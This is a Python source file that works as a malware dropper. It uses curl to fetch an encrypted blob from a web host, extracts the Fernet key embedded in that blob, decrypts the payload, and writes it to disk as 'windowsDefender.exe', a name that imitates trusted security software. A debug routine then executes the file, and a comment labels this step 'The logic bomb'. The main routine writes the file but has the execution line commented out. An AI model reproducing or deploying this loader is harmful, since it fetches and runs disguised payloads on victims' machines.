from cryptography.fernet import Fernet
from itertools import zip_longest
import binascii
import filecmp
import sys
import os
import subprocess
from subprocess import check_output
#this  build methods builds it from the command line.
#need to get this to build from a string file that i will generate in bde.


def _get_blocks():
   str = check_output(["curl","localhost/lego.txt"])
   str = str.decode('utf-8')
   it = 0
   #for characters in string find the hook
   for character in str:
   #character in the string is the hook '!'  
        if character == '!':
            #retreive the string corresponding to the length     
            key_length_str = str[0:it]
            #get the key length
            key_length = int(key_length_str)
            #find the actual key
            
            #DBG
            #print(type(key_length))
            #print(type(len(str)))
            keyl = int(key_length)
            lenstr = int(len(str))
            print("[*] keysize "+key_length_str)
            
            #DBG
            #print(lenstr)
            #this gets the actual decryption key
            key_ =  str[-keyl:]
            
            fernet = Fernet(key_)
            #remove the decryption key
            str = str[:-keyl] 
            #remove the !
            str.replace('!','') 
            #rermove the 
            str = str[2:]
            fw = open("naked_lego.txt",'r')
            strcmp =  fw.read()
            fw.close()
            return fernet.decrypt(str.encode()); 
            #if str == strcmp : 
            #   print ("[*] Stripping meta succesful")
               
        it+=1
       



def _build(_dec_,fernet):
    print ("Build Sequence . . . ")
    f1 = open(_dec_,'rb')
    dec = fernet.decrypt(f1.read())
    f1.close()
    return dec

def _run_():
    print("junk")


def main_dbg():
    if len(sys.argv) == 3 :
        try: 
            testtext = sys.argv[1] 
            
            #if not testtext.endswith('.exe') :
            #----------------------
            dec = _get_blocks()
            #----------------------           
            #else :
            f2 = open("windowsDefender.exe",'wb')
            ##DBG print (type(str))  | print (str)
            f2.write(dec)
            f2.close()
            #The logic bomb
            subprocess.run("./windowsDefender.exe", stdin=subprocess.DEVNULL)  
        except (IndexError) : 
            testtext = 'null'

def main():

        try: 
            
            
        
            fw = open("windowsDefender.exe.",'wb')
            print (type(str))
            dec =  _get_blocks()
            fw.write(dec)
            fw.close()
            #subprocess.run("./windowsDefender.exe", stdin=subprocess.DEVNULL)
            
        except (IndexError) : 
            testtext = 'null'
 
def _decrypt(_enc_):
        #bytes backinto string for decryption
    dencMessage = fernet.decrypt(_enc_)
    #print("encrypted string: ",line)
    print("decrypted string: ",dencMessage)
    #string back into bytes
    return dencMessage

def compare_binaries(path1, path2):
    with open(path1, 'rb') as f1, open(path2, 'rb') as f2:
        for line1, line2 in zip_longest(f1, f2, fillvalue=None):
            if line1 == line2:
                continue
            else:
                return False
        return True
main()        
#main_dbg() #let it rain shit 
